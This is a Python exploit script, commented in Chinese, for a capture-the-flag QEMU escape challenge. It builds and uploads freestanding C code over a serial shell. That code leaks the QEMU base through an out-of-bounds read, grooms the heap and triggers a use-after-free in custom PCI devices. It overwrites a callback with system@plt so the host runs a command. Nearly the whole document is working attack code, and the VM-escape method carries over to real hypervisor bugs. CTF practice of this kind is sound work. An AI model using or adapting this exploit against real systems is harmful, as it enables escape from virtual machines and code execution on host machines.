#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""PWN12 ez_qemu exploit.

题目给 guest 一个 root 串口 shell，目标是利用 QEMU 自定义设备的 UAF 逃逸到
宿主，读 /tmp/flag_f。本脚本做两件事：

  1. 把题解描述的 guest 侧 freestanding ELF 源码（见 GUEST_SOURCE）用
     gcc -Os -s -nostdlib -static -no-pie -ffreestanding 编译出来；
  2. 按串口协议把 gzip+base64 的载荷按 76 列 heredoc 上传，
     guest 侧 uudecode / gzip -dc 还原后执行，最后 poweroff -f。

guest 侧利用链（与题解一致）：
  * 枚举 4 个 BAR（nic 03.0、watchdog 03.1、audio 03.2、logger 03.3），
    mmap resource0 并向配置空间 +0x04 写 command |= 7；
  * mmap 一页匿名内存并 mlock，用 /proc/self/pagemap 取 guest 物理地址；
  * logger 写 {pa, 0x1010, 0x80, 1} 越界读宿主栈，guest 页 +0x08 得到
    PIE+0x4132c7 -> 基址、system@plt = 基址 + 0x2e2c90；
  * 在 guest 页 +0x08 写 "/bin/cat /tmp/flag_f"、+0x48 写 system@plt，
    audio 以该页为源、长度 0x50 提交拷贝；
  * watchdog +0x10 reset 让 0x58 定时器对象落在 vCPU arena，audio 7 次
    alloc/free 填满 0x60 tcache；
  * NIC 描述符：a0=watchdog+0x28（释放）、a1=audio+0x00（重新分配）、
    st=audio+0x14（commit 覆盖 +0x08 命令串与 +0x48 回调），
    最后写 NIC +0x1c 触发 RX，收尾用缓存的旧指针调用 system(命令串)。

用法：
    python3 exp.py <host> <port> [--keep]
"""

from __future__ import annotations

import argparse
import base64
import gzip
import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time

DEFAULT_CC = "gcc"
CFLAGS = [
    "-Os", "-s", "-nostdlib", "-static", "-no-pie",
    "-ffreestanding", "-fno-builtin", "-fno-stack-protector",
]

# --------------------------------------------------------------------------- #
# guest 侧 freestanding exploit（直接发原始 syscall，不链接 libc）
# --------------------------------------------------------------------------- #
GUEST_SOURCE = r"""
typedef unsigned long long u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;

#define SYS_read        0
#define SYS_write       1
#define SYS_openat      257
#define SYS_pread64     17
#define SYS_mmap        9
#define SYS_mlock       149
#define SYS_exit_group  231

#define AT_FDCWD        (-100)
#define O_RDONLY        0
#define O_RDWR          2
#define PROT_READ       1
#define PROT_WRITE      2
#define MAP_SHARED      1
#define MAP_PRIVATE     2
#define MAP_ANONYMOUS   0x20

static inline long sc6(long n, long a1, long a2, long a3, long a4, long a5, long a6)
{
    long ret;
    register long r10 __asm__("r10") = a4;
    register long r8  __asm__("r8")  = a5;
    register long r9  __asm__("r9")  = a6;
    __asm__ volatile ("syscall"
                      : "=a"(ret)
                      : "a"(n), "D"(a1), "S"(a2), "d"(a3),
                        "r"(r10), "r"(r8), "r"(r9)
                      : "rcx", "r11", "memory");
    return ret;
}

static inline long sc3(long n, long a1, long a2, long a3)
{
    return sc6(n, a1, a2, a3, 0, 0, 0);
}

static long sys_open(const char *path, int flags)
{
    return sc6(SYS_openat, AT_FDCWD, (long)path, flags, 0, 0, 0);
}

static long sys_read(int fd, void *buf, u64 len)
{
    return sc3(SYS_read, fd, (long)buf, len);
}

static long sys_pread(int fd, void *buf, u64 len, u64 off)
{
    return sc6(SYS_pread64, fd, (long)buf, len, off, 0, 0);
}

static void *sys_mmap(void *addr, u64 len, int prot, int flags, int fd, u64 off)
{
    long r = sc6(SYS_mmap, (long)addr, len, prot, flags, fd, off);
    if (r < 0 && r > -4096)
        return (void *)0;
    return (void *)r;
}

static void sys_exit(int code)
{
    sc6(SYS_exit_group, code, 0, 0, 0, 0, 0);
    for (;;)
        ;
}

/* ---- 极简输出 ---- */
static u64 slen(const char *s)
{
    u64 n = 0;
    while (s[n])
        n++;
    return n;
}

static void puts_(const char *s)
{
    sc3(SYS_write, 1, (long)s, slen(s));
}

static void puthex(u64 v)
{
    char buf[19];
    const char *digits = "0123456789abcdef";
    int i;
    buf[0] = '0';
    buf[1] = 'x';
    for (i = 0; i < 16; i++)
        buf[2 + i] = digits[(v >> (60 - 4 * i)) & 0xf];
    buf[18] = 0;
    puts_(buf);
}

static void putdec(u64 v)
{
    char buf[24];
    int i = 23;
    buf[i] = 0;
    if (!v)
        buf[--i] = '0';
    while (v && i > 1) {
        buf[--i] = (char)('0' + (v % 10));
        v /= 10;
    }
    puts_(&buf[i]);
}

static u32 rd32(void *p)
{
    return *(volatile u32 *)p;
}

static void wr32(void *p, u32 v)
{
    *(volatile u32 *)p = v;
}

static void wr64(void *p, u64 v)
{
    *(volatile u32 *)p = (u32)v;
    *(volatile u32 *)((u8 *)p + 4) = (u32)(v >> 32);
}

/* ---- BAR 与 pagemap ---- */
struct bar {
    volatile u8 *mmio;   /* resource0 映射 */
    u64 phys;            /* BAR 物理基址 */
};

static int dev_path(char *dst, int slot, const char *leaf)
{
    const char *pfx = "/sys/bus/pci/devices/0000:00:03.";
    int i = 0, j;
    while (pfx[i]) { dst[i] = pfx[i]; i++; }
    dst[i++] = (char)('0' + slot);
    dst[i++] = '/';
    for (j = 0; leaf[j]; j++)
        dst[i + j] = leaf[j];
    dst[i + j] = 0;
    return i + j;
}

static void *map_bar(int slot, struct bar *out)
{
    char path[128];
    char buf[64];
    int fd, n, i;
    u64 base = 0;

    dev_path(path, slot, "resource0");
    fd = (int)sys_open(path, O_RDWR);
    if (fd < 0)
        return 0;
    out->mmio = (volatile u8 *)sys_mmap(0, 0x1000, PROT_READ | PROT_WRITE,
                                        MAP_SHARED, fd, 0);
    if (!out->mmio)
        return 0;

    /* 读 resource 文件拿 BAR 物理基址（不能假设固定值） */
    dev_path(path, slot, "resource");
    fd = (int)sys_open(path, O_RDONLY);
    if (fd >= 0) {
        n = (int)sys_read(fd, buf, 63);
        if (n > 0) {
            buf[n] = 0;
            for (i = 0; i < n && buf[i] != '\n'; i++) {
                int c = buf[i];
                u64 d;
                if (c >= '0' && c <= '9') d = (u64)(c - '0');
                else if (c >= 'a' && c <= 'f') d = (u64)(c - 'a' + 10);
                else if (c >= 'A' && c <= 'F') d = (u64)(c - 'A' + 10);
                else break;
                base = (base << 4) | d;
            }
        }
    }
    out->phys = base;
    return (void *)out->mmio;
}

static int enable_bus_master(int slot)
{
    char path[128];
    u16 cmd = 0;
    int fd;

    dev_path(path, slot, "config");
    fd = (int)sys_open(path, O_RDWR);
    if (fd < 0)
        return -1;
    if (sys_pread(fd, &cmd, 2, 4) != 2)
        return -1;
    cmd |= 0x7;                       /* IO + MEM + bus master */
    {
        long r = sc6(18 /* pwrite64 */, fd, (long)&cmd, 2, 4, 0, 0);
        if (r != 2)
            return -1;
    }
    return 0;
}

static u64 virt_to_phys(void *p)
{
    u64 entry = 0;
    u64 va = (u64)p;
    int fd = (int)sys_open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
        return 0;
    if (sys_pread(fd, &entry, 8, (va >> 12) * 8) != 8)
        return 0;
    return ((entry & ((1ULL << 55) - 1)) << 12) | (va & 0xfff);
}

struct desc {
    u64 a0;
    u32 l0;
    u32 r0;
    u64 a1;
    u32 l1;
    u32 r1;
    u64 st;
};

static void clear_page(u8 *page, u64 len)
{
    u64 i;
    for (i = 0; i < len; i++)
        page[i] = 0;
}

int main(void)
{
    struct bar nic, wdt, aud, log;
    struct desc *d;
    u8 *page;
    u64 page_pa;
    u64 leak, qemu_base, system_plt;
    u64 desc_pa;
    int i;

    puts_("[*] mapping BARs\n");
    if (!map_bar(0, &nic) || !map_bar(1, &wdt) ||
        !map_bar(2, &aud) || !map_bar(3, &log)) {
        puts_("[-] BAR mapping failed\n");
        sys_exit(1);
    }
    for (i = 0; i < 4; i++) {
        if (enable_bus_master(i) != 0) {
            puts_("[-] bus master failed\n");
            sys_exit(1);
        }
    }
    puts_("[*] nic=");   puthex(nic.phys);
    puts_(" wdt=");      puthex(wdt.phys);
    puts_(" aud=");      puthex(aud.phys);
    puts_(" log=");      puthex(log.phys);
    puts_("\n");

    page = (u8 *)sys_mmap(0, 0x1000, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (!page) {
        puts_("[-] page mmap failed\n");
        sys_exit(1);
    }
    sc3(SYS_mlock, (long)page, 0x1000, 0);
    page_pa = virt_to_phys(page);
    puts_("[*] guest page pa="); puthex(page_pa); puts_("\n");
    if ((page_pa & 0xfff) || page_pa == 0) {
        puts_("[-] pagemap PFN unavailable\n");
        sys_exit(1);
    }

    /* ---- logger 越界读泄露 PIE ---- */
    wr32((u8 *)log.mmio + 0x00, (u32)page_pa);
    wr32((u8 *)log.mmio + 0x04, (u32)(page_pa >> 32));
    wr32((u8 *)log.mmio + 0x08, 0x1010);      /* off：0x1000-off 下溢 */
    wr32((u8 *)log.mmio + 0x0c, 0x80);        /* len */
    wr32((u8 *)log.mmio + 0x10, 1);           /* trigger */

    leak = 0;
    for (i = 0; i < 8; i++)
        leak |= ((u64)page[0x08 + i]) << (8 * i);
    puts_("[*] leak="); puthex(leak); puts_("\n");
    if ((leak & 0xfff) != 0x2c7 || leak < 0x1000000000ULL) {
        puts_("[-] leak check failed (ret low12 != 0x2c7)\n");
        sys_exit(1);
    }
    qemu_base = leak - 0x4132c7;
    system_plt = qemu_base + 0x2e2c90;
    puts_("[*] qemu base=");  puthex(qemu_base);  puts_("\n");
    puts_("[*] system@plt="); puthex(system_plt); puts_("\n");

    /* ---- 布置命令串与回调 ---- */
    clear_page(page, 0x1000);
    {
        const char *cmd = "/bin/cat /tmp/flag_f";
        for (i = 0; cmd[i]; i++)
            page[0x08 + i] = (u8)cmd[i];
        page[0x08 + i] = 0;
    }
    wr64(page + 0x48, system_plt);

    /* watchdog reset：在 vCPU 线程重新分配 0x58 定时器 */
    wr32((u8 *)wdt.mmio + 0x10, 1);
    /* 7 次 audio alloc/free 填满 0x60 tcache */
    for (i = 0; i < 7; i++) {
        wr32((u8 *)aud.mmio + 0x00, 1);
        wr32((u8 *)aud.mmio + 0x04, 1);
    }
    /* audio 源地址与长度：commit 时从 guest 页拷 0x50 字节到缓冲 */
    wr32((u8 *)aud.mmio + 0x08, (u32)page_pa);
    wr32((u8 *)aud.mmio + 0x0c, (u32)(page_pa >> 32));
    wr32((u8 *)aud.mmio + 0x10, 0x50);

    /* ---- NIC RX 描述符：释放 -> 重新分配 -> commit 覆盖 ---- */
    d = (struct desc *)(page + 0x100);
    d->a0 = wdt.phys + 0x28;      /* watchdog +0x28：释放定时器 */
    d->l0 = 4;
    d->a1 = aud.phys + 0x00;      /* audio +0x00：重新分配 0x58 */
    d->l1 = 4;
    d->st = aud.phys + 0x14;      /* audio +0x14：commit */

    desc_pa = page_pa + 0x100;
    wr32((u8 *)nic.mmio + 0x10, (u32)desc_pa);
    wr32((u8 *)nic.mmio + 0x14, (u32)(desc_pa >> 32));
    puts_("[*] triggering RX\n");
    wr32((u8 *)nic.mmio + 0x1c, 1);
    puts_("[+] RX finished\n");
    for (;;)
        ;
    return 0;
}

void _start(void)
{
    int rc = main();
    sys_exit(rc);
}
"""


def build_guest_binary(outdir: str) -> str:
    cc = shutil.which(DEFAULT_CC)
    if not cc:
        raise SystemExit("找不到 gcc，无法编译 guest 侧 freestanding ELF")
    src = os.path.join(outdir, "guest_exp.c")
    elf = os.path.join(outdir, "guest_exp")
    with open(src, "w", encoding="ascii") as fh:
        fh.write(GUEST_SOURCE)
    cmd = [cc] + CFLAGS + ["-o", elf, src]
    print("[*] build: %s" % " ".join(cmd))
    rv = subprocess.run(cmd, capture_output=True, text=True)
    if rv.returncode != 0:
        sys.stderr.write(rv.stdout)
        sys.stderr.write(rv.stderr)
        raise SystemExit("guest 侧编译失败")
    size = os.path.getsize(elf)
    print("[*] guest ELF = %d bytes" % size)
    return elf


# --------------------------------------------------------------------------- #
# 串口上传
# --------------------------------------------------------------------------- #
def b64_lines(data: bytes) -> list:
    packed = gzip.compress(data, compresslevel=9, mtime=0)
    encoded = base64.b64encode(packed).decode("ascii")
    lines = ["begin-base64 644 /ez_qemu.gz"]
    lines.extend(encoded[i:i + 76] for i in range(0, len(encoded), 76))
    lines.append("====")
    print("[+] payload %d bytes -> gzip %d -> serial %d bytes"
          % (len(data), len(packed), sum(len(x) + 1 for x in lines)))
    return lines


def run(host: str, port: int, elf: str, keep: bool) -> int:
    payload = open(elf, "rb").read()
    lines = b64_lines(payload)

    sock = socket.create_connection((host, port), timeout=25)
    sock.settimeout(0.5)

    def send(line: str) -> None:
        sock.sendall(line.encode("ascii") + b"\n")

    def drain_until(marker: bytes, timeout: float = 60.0) -> bytes:
        deadline = time.monotonic() + timeout
        buf = bytearray()
        while time.monotonic() < deadline:
            try:
                chunk = sock.recv(16384)
            except socket.timeout:
                continue
            if not chunk:
                break
            buf += chunk
            if marker in buf:
                break
        return bytes(buf)

    print("[*] waiting for READY_FOR_ESC / shell prompt")
    drain_until(b"READY_FOR_ESC", 60)
    drain_until(b"# ", 60)

    send("cat > /tmp/p.b64 <<'__B64__'")
    for line in lines:
        send(line)
        time.sleep(0.025)         # ttyS0 输入队列很浅，必须留间隔
    send("__B64__")
    send("uudecode /tmp/p.b64 && gzip -dc /ez_qemu.gz > /ez_qemu && chmod +x /ez_qemu")
    time.sleep(0.5)
    send("/ez_qemu")

    out = drain_until(b"[+] RX finished", 120)
    text = out.decode("latin-1", "replace")
    print(text)

    if not keep:
        send("poweroff -f")       # -no-reboot 下让 QEMU 立即退出
    try:
        sock.close()
    except OSError:
        pass
    return 0


def main() -> None:
    ap = argparse.ArgumentParser(description="PWN12 ez_qemu exploit")
    ap.add_argument("host", help="远端地址（占位，替换为题目下发地址）")
    ap.add_argument("port", type=int, help="远端端口")
    ap.add_argument("--keep", action="store_true", help="结束后不发送 poweroff")
    ap.add_argument("--build-only", action="store_true", help="只编译不上传")
    args = ap.parse_args()

    with tempfile.TemporaryDirectory() as tmp:
        elf = build_guest_binary(tmp)
        if args.build_only:
            dst = os.path.join(os.path.dirname(os.path.abspath(__file__)), "guest_exp")
            shutil.copyfile(elf, dst)
            print("[*] 已保存到 %s" % dst)
            return
        run(args.host, args.port, elf, args.keep)


if __name__ == "__main__":
    main()
